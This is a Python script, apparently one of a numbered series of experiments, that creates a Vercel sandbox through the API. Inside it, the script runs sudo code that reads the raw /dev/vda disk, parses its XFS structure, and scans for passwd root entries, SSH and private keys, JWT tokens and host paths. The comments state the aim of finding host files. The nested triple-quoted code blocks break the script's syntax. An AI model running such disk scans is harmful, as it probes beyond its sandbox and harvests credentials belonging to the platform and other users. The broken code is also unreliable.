# 实验J249: 确认 /dev/vda 内容 - 读偏移找宿主文件 + XFS 结构解析
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj249"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE_A = r'''
import subprocess, os
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# 磁盘信息
r = subprocess.run("cat /sys/class/block/vda/size 2>/dev/null; echo ---; cat /sys/class/block/vda/device/model 2>/dev/null; echo ---; ls -la /sys/class/block/ | head -20", shell=True, capture_output=True, text=True, timeout=10)
p("VDA_INFO", (r.stdout + r.stderr)[:800].replace(chr(10), "|"))
# 读多个偏移 (sudo python)
code = r'''
import os
fd = os.open("/dev/vda", os.O_RDONLY)
for off in (0, 0x1000, 0x100000, 0x1000000, 0x10000000, 0x40000000):
    os.lseek(fd, off, 0)
    d = os.read(fd, 4096)
    # 提取可打印 ASCII 片段
    frags = []
    cur = ""
    for b in d:
        if 32 <= b < 127:
            cur += chr(b)
        else:
            if len(cur) >= 6:
                frags.append(cur)
            cur = ""
    if len(cur) >= 6:
        frags.append(cur)
    p("OFF", hex(off), "got", len(d), "frags", len(frags))
    for f in frags[:6]:
        p("   ", f[:100])
os.close(fd)
'''
try:
    r = subprocess.run(["sudo", "-n", "python3", "-c", code], capture_output=True, text=True, timeout=15)
    p("MULTI_READ", "rc", r.returncode, "OUT", (r.stdout + r.stderr)[:2000].replace(chr(10), "|"))
except Exception as e:
    p("MULTI_READ", "EXC", type(e).__name__, str(e)[:100])
p("DONE_A", flush=True)
'''
run_cmd(sid, CODE_A, "A_VDA", timeout=100)

CODE_B = r'''
import subprocess
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# 全盘扫描 vda 找明文文件内容 (每 4MB 读 512B 采样? 不 - 直接快速扫: 读 1MB 块, 搜 /etc/ 和 root: 特征)
code = r'''
import os, re
fd = os.open("/dev/vda", os.O_RDONLY)
# XFS superblock: magic @0, bsize @4 (4B), dblocks @8 (8B), agcount @96 (4B)
sb = os.read(fd, 512)
import struct
magic = sb[:4]
bsize = struct.unpack(">I", sb[4:8])[0]
dblocks = struct.unpack(">Q", sb[8:16])[0]
agcount = struct.unpack(">I", sb[96:100])[0]
agsize = struct.unpack(">I", sb[100:104])[0]
p = print
p("XFS magic", magic, "bsize", bsize, "dblocks", dblocks, "agcount", agcount, "agsize", agsize)
# 盘大小 = dblocks * bsize
p("FS_SIZE", dblocks * bsize, "bytes")
# 在若干 AG 起始处采样 (每个 AG 开头 1MB 内可能有 inode 区/目录)
# XFS: AG0: superblock+agf+agi+agfl (4 blocks), 之后 inode 区
for ag in range(min(agcount, 4)):
    base = ag * agsize * bsize
    os.lseek(fd, base + 4 * bsize, 0)
    d = os.read(fd, bsize * 4)
    frags = []
    cur = ""
    for b in d:
        if 32 <= b < 127:
            cur += chr(b)
        else:
            if len(cur) >= 8:
                frags.append(cur)
            cur = ""
    if len(cur) >= 8:
        frags.append(cur)
    p("AG", ag, "base", hex(base), "frags", len(frags))
    for f in frags[:8]:
        p("   ", f[:120])
os.close(fd)
'''
try:
    r = subprocess.run(["sudo", "-n", "python3", "-c", code], capture_output=True, text=True, timeout=20)
    p("XFS_PARSE", "rc", r.returncode, "OUT", (r.stdout + r.stderr)[:2500].replace(chr(10), "|"))
except Exception as e:
    p("XFS_PARSE", "EXC", type(e).__name__, str(e)[:100])
p("DONE_B", flush=True)
'''
run_cmd(sid, CODE_B, "B_XFS", timeout=100)

CODE_C = r'''
import subprocess
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
# 广域采样: 每 64MB 读 64KB, 找文本特征 (root:, /etc/, /home/, vercel, docker, passwd)
code = r'''
import os, re
fd = os.open("/dev/vda", os.O_RDONLY)
import struct
sb = os.read(fd, 512)
bsize = struct.unpack(">I", sb[4:8])[0]
dblocks = struct.unpack(">Q", sb[8:16])[0]
fssize = dblocks * bsize
pats = [rb"root:[^:]*:[0-9]+:[0-9]+", rb"/etc/passwd", rb"/home/[a-z0-9_-]+", rb"vercel", rb"docker", rb"ssh", rb"BEGIN [A-Z ]*PRIVATE KEY", rb"eyJ[A-Za-z0-9_-]{20,}\."]
step = 64 * 1024 * 1024
off = 0
hits = {}
while off < min(fssize, 4 * 1024 * 1024 * 1024):
    os.lseek(fd, off, 0)
    d = os.read(fd, 64 * 1024)
    if not d:
        break
    for pat in pats:
        for m in re.findall(pat, d):
            s = m[:120]
            hits.setdefault(pat, []).append((hex(off), s))
    off += step
p = print
for pat, lst in hits.items():
    p("HIT", pat, len(lst))
    for o, s in lst[:5]:
        p("   ", o, s[:120])
if not hits:
    p("NO_HITS", "sampled", off)
os.close(fd)
'''
try:
    r = subprocess.run(["sudo", "-n", "python3", "-c", code], capture_output=True, text=True, timeout=30)
    p("WIDE", "rc", r.returncode, "OUT", (r.stdout + r.stderr)[:2500].replace(chr(10), "|"))
except Exception as e:
    p("WIDE", "EXC", type(e).__name__, str(e)[:100])
p("DONE_C", flush=True)
'''
run_cmd(sid, CODE_C, "C_WIDE", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
